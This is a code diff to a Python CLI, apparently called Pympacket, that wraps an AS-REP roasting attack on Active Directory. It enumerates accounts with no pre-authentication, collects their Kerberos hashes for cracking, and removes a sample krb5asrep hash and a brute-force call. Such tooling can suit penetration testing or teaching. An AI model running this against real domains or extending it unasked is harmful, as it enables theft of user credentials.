@@ -2,7 +2,6 @@ import cmd
 import argparse
 import re
 from pympacket.attacks.GetNPUsers import GetUserNoPreAuth
-from pympacket.utils.bruteforce import bruteforce_asrep, Target
 
 def ipv4_address(value):
     # Regular expression to match an IPv4 address (four octets)
@@ -15,9 +14,11 @@ class ImpacketCLI(cmd.Cmd):
     # Your CLI commands and functionality will go here
     prompt = '>> '
     intro = 'Welcome to Pympacket. Type "help" for available commands.'  # Your intro message
+    found_hashes: list[str] = []
+    found_users: list[str] = []
     
     def do_enum(self, args):
-        """Get users with no pre-authentication"""
+        """Get hashes of users with no pre-authentication"""
         parser = argparse.ArgumentParser(prog='enum', description='Runs an enumeration test.')
         parser.add_argument('-d', '--domain', type=str, required=True, help='The domain to test.')
         parser.add_argument('-dcip', '--dc-ip', type=ipv4_address, required=True, help='The ip of the domain controller. (IPv4)')
@@ -41,11 +42,26 @@ class ImpacketCLI(cmd.Cmd):
 
         npu = GetUserNoPreAuth(username=args.username, password=args.password, domain=args.domain, cmdLineOptions=cmdLineOptions)
 
-        target_user = Target(username='l.douglas', domain='contoso.local', hash='$krb5asrep$23$l.douglas@CONTOSO.LOCAL:3b2b825dcf3910791f9e6c6c6452978b$e74721709d2f4d2b29574c066791fca58cd026aacc20fadf6158d160a4a82d637fe8dd344d02dede890ea21442e61c321dce943ed7b58e1c2f41ebacbe5d0295958eadf4607d4e2527428f2b26f48d6457f2c451fc59ad3b365921699b6449f9aa985cc6e1c2c89cc720915892136c9a8851310077d44c3783f393671dc8fda1b5c05c9b1acfb8211f8d42545c5d32d6269ffe8f5c139ae24cf71207c5184f860ca0487181f5d124d7fa5d5ecf81f38eb24783249d46e137aa5acef6a45ebd63d8ecfdd8b0173a46fff5d0382ccab4456b32a7d8c6e3dfc505f529162c8f8b63494ab6a54e5e5a203f36a3621bbb')
+        hashes = npu.run()
 
-        # print(bruteforce_asrep(wordlist='fasttrack.txt', hash=target_user.hash))
+        for index, hash in enumerate(hashes):
+            # Split the hash by `$` to isolate the user@domain part
+            user_realm = hash.split('$')[3]
 
-        print(npu.run())
+            # Split the user@domain part by `@` to get only the user
+            user = user_realm.split('@')[0]
+            if user not in self.found_users:
+                self.found_users.append(user)
+                self.found_hashes.append(hash)
+            else:
+                self.found_hashes[self.found_users.index(user)] = hash
+
+        print(f'Found {len(hashes)} vulnerable hashes.')
+
+    def do_list(self, args):
+        """List found vulnerable hases."""
+        for hash in self.found_hashes:
+            print(f'{hash}\n')
 
     def do_quit(self, line):
         """Exit the CLI."""
